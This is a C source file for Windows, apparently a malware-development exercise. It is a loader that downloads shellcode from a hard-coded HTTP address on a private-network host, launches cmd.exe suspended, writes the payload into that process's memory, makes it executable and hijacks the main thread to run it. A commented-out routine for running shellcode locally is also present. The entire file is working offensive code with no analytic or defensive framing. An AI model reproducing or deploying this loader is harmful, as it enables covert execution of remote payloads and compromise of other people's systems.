#include <stdio.h>
#include <Windows.h>
#include <WinInet.h>
#include <string.h>
#include <Tlhelp32.h>
#pragma comment (lib, "Wininet.lib")
#pragma warning (disable:4996)


#define TARGET_PROCESS		"cmd.exe"

#define PAYLOAD	L"http://192.168.216.130:8080/tests"

BOOL ProcessENumeration(IN LPWSTR szProcessName, OUT int* PID) {
	int pid;
	HANDLE hSnapShot = NULL;
	PROCESSENTRY32	Proc = {
				.dwSize = sizeof(PROCESSENTRY32)
	};

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);


	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		return -1;
	}

	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!} 32 First Failed with : %d \n", GetLastError());
		return -1;
	}
	do {
		wprintf(L" [*] Process Name : %s \n", Proc.szExeFile);
		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
			*PID = Proc.th32ProcessID;
			wprintf(L"Process Match : %s \n", Proc.szExeFile);

			break;
		};
	} while (Process32Next(hSnapShot, &Proc));

	return 0;
}

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T		sSize = NULL; 	 			// Used as the total payload size

	PBYTE		pBytes = NULL,					// Used as the total payload heap buffer
		pTmpBytes = NULL;	// Used as the tmp buffer (of size 1024)
	//DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
	//	INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_RELOAD;




	hInternet = InternetOpenW(L"MyUserAgent", NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	//if (!DisableSslVerification(hInternet)) {
	//	printf("[!] Failed to disable SSL verification\n");
	//	bSTATE = FALSE;
	//	goto _EndOfFunction;
	//}
	// Opening the handle to the payload using the payload's URL
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
	if (!hInternetFile) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		// Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Calculating the total size of the total buffer 
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole payload
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer
		memset(pTmpBytes, '\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop 
		if (dwBytesRead < 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}


	// Saving 
	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);											// Closing handle 
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);										// Closing handle
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
	if (pTmpBytes)
		LocalFree(pTmpBytes);													// Freeing the temp buffer
	return bSTATE;
}


//int execute(PBYTE pDeobfuscatedPayload, SIZE_T sDeobfuscatedSize) {
//	PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
//	if (pShellcodeAddress == NULL) {
//		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
//		return -1;
//	}
//	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);
//
//	printf("[#] Press <Enter> To Write Payload ... ");
//	getchar();
//	memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
//	/*memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);*/
//
//
//	DWORD dwOldProtection = NULL;
//	
//	if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
//		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
//		return -1;
//	}
//	printf("Old Protection: 0x%08X\n", dwOldProtection);
//	printf("[#] Press <Enter> To Run ... ");
//	getchar();
//	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, NULL);
//	if (hThread == NULL) {
//		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
//		return -1;
//	}
//	WaitForSingleObject(hThread, INFINITE);
//	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
//	printf("[#] Press <Enter> To Quit ... ");
//	getchar();
//	return 0;
//}

int main() {

	SIZE_T	Size = NULL;
	PBYTE	Bytes = NULL;
	int pid_match = 0;
	LPWSTR test = L"svchost.exe";
	//HANDLE	hPID_Process = NULL;
	//DWORD	dwPID_ProcessId = NULL;
	ProcessENumeration(test, &pid_match);
	printf("here : %d", pid_match);

	// Reading the payload 
	if (!GetPayloadFromUrl(PAYLOAD, &Bytes, &Size)) {
		return -1;
	}


	printf("[i] Bytes : 0x%p \n", Bytes);
	printf("[i] Size  : %ld \n", Size);

	///Printing it
	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0)
			printf("\n");

		printf("%0.2X ", Bytes[i]);
	}
	printf("\n\n");
	if (Bytes == NULL || Size == 0) {
		printf("[!] Payload buffer is invalid.\n");
		return -1;
	}
	// Freeing
	/*LocalFree(Bytes);*/
	//execute(), sizeof(buf));
	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	HANDLE		hProcess = NULL, hThread = NULL;

	DWORD		dwProcessId = NULL;

	PVOID		pAddress = NULL;


	//	creating target remote process (in suspended state)
	printf("[i] Creating \"%s\" Process ... ", TARGET_PROCESS);
	if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}
	printf("\t[i] Target Process Created With Pid : %d \n", dwProcessId);
	printf("[+] DONE \n\n");


	// injecting the payload and getting the base address of it
	printf("[i] Writing Shellcode To The Target Process ... ");
	if (!InjectShellcodeToRemoteProcess(hProcess, Bytes, Size, &pAddress)) {
		return -1;
	}
	printf("[+] DONE \n\n");


	// performing thread hijacking to run the payload
	printf("[i] Hijacking The Target Thread To Run Our Shellcode ... ");
	if (!HijackThread(hThread, pAddress)) {
		return -1;
	}
	printf("[+] DONE \n\n");


	printf("[#] Press <Enter> To Quit ... ");
	getchar();


	return 0;
}


BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR				    lpPath[MAX_PATH * 2];
	CHAR				    WnDr[MAX_PATH];

	STARTUPINFO			    Si = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };

	// Cleaning the structs by setting the member values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the value of the %WINDIR% environment variable
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Creating the full target process path 
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);

	if (!CreateProcessA(
		NULL,					// No module name (use command line)
		lpPath,					// Command line
		NULL,					// Process handle not inheritable
		NULL,					// Thread handle not inheritable
		FALSE,					// Set handle inheritance to FALSE
		CREATE_SUSPENDED,		// Creation flag
		NULL,					// Use parent's environment block
		NULL,					// Use parent's starting directory 
		&Si,					// Pointer to STARTUPINFO structure
		&Pi)) {					// Pointer to PROCESS_INFORMATION structure

		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");

	// Populating the OUT parameters with CreateProcessA's output
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	// Doing a check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}
BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {


	SIZE_T  sNumberOfBytesWritten = NULL;
	DWORD   dwOldProtection = NULL;


	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);


	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	return TRUE;
}
BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {

	CONTEXT		ThreadCtx = {
			.ContextFlags = CONTEXT_CONTROL
	};

	// getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("\n\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// updating the next instruction pointer to be equal to our shellcode's address 
	ThreadCtx.Rip = pAddress;

	// setting the new updated thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("\n\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("\n\t[#] Press <Enter> To Run ... ");
	getchar();

	// resuming suspended thread, thus running our payload
	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}